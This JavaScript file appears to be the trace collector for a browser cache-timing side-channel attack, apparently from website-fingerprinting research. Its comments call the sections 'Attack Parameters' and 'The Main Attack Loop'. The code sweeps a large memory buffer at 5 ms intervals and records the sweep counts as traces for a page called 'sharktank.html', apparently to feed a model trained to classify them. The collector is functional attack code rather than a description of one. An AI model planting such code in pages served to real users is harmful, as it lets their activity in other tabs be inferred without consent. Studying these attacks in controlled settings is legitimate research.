// --- 1. Global Configuration ---
window.recording = false;
window.traces = [];
// Default to 3000ms (3s) to match your backend model training
// Python automation might overwrite this, which is fine.
window.trace_length = 5000; 

// --- 2. Attack Parameters ---
const P = 5;               // Interval in ms (The "Resolution")
const LINE_SIZE = 8;       // Elements per cache line (Architecture dependent)
const M_LINES = 150000;    // Total cache lines to flush (The "Hammer")

// The Memory Buffer (Global to prevent garbage collection hiccups)
let M = null; 
let T = null;

// --- 3. The Flush Function ---
function sweep() {
    // Touch every cache line to force evictions
    for (let i = 0; i < M_LINES; i++) {
        M[i * LINE_SIZE] += 1;
    }
}

// --- 4. The Main Attack Loop ---
function recordMainThread() {
    const duration = window.trace_length;

    // A. Allocate Memory (Only once)
    if (M === null) {
        console.log("Allocating memory buffer...");
        M = new Array(M_LINES * LINE_SIZE + 1).fill(0);
        sweep(); // Warmup to page-in the array
    }

    // B. Prepare Trace Array
    // We pre-allocate to avoid memory allocation delays during the attack
    T = new Array(Math.floor(duration / P) + 2000).fill(-1);

    const start = performance.now();
    let idx = 0;

    // --- C. THE BLOCKING LOOP (Critical Section) ---
    // This blocks the UI thread for 'duration' milliseconds
    while (performance.now() - start < duration) {
        const windowStart = performance.now();
        let count = 0;
        
        // Count how many cache sweeps we can fit in time P
        while (performance.now() - windowStart < P) {
            sweep();
            count++;
        }
        
        // Save the count if we have space
        if (idx < T.length) {
            T[idx++] = count;
        }
    }

    // --- D. Save Data ---
    // Cut off the unused end of the array
    const validTrace = T.slice(0, idx);
    
    // Push to global array for sharktank.html to find
    window.traces.push(validTrace);
    
    // IMPORTANT: Release the lock
    window.recording = false;

    // --- E. Update UI (Safely) ---
    const statusEl = document.getElementById("status-indicator");
    if (statusEl) {
        statusEl.innerText = "● PROCESSING";
        statusEl.style.color = "#00ffcc"; // Restore Cyan color
    }
    
    console.log(`Trace captured! Length: ${validTrace.length}`);
}

// --- 5. The Trigger Function ---
// This is what sharktank.html calls to start the process
window.collectTrace = function() {
    if (window.recording) return;

    console.log("Starting main thread trace...");
    window.recording = true;

    // 1. Update UI to warn user
    const statusEl = document.getElementById("status-indicator");
    if (statusEl) {
        statusEl.innerText = "● RECORDING (FREEZE)";
        statusEl.style.color = "#ff3333"; // Red warning color
    }

    // 2. Yield to the browser renderer for 50ms
    // This ensures the "Recording" text actually paints to the screen
    // before the heavy loop freezes the browser.
    setTimeout(() => {
        recordMainThread();
    }, 50);
};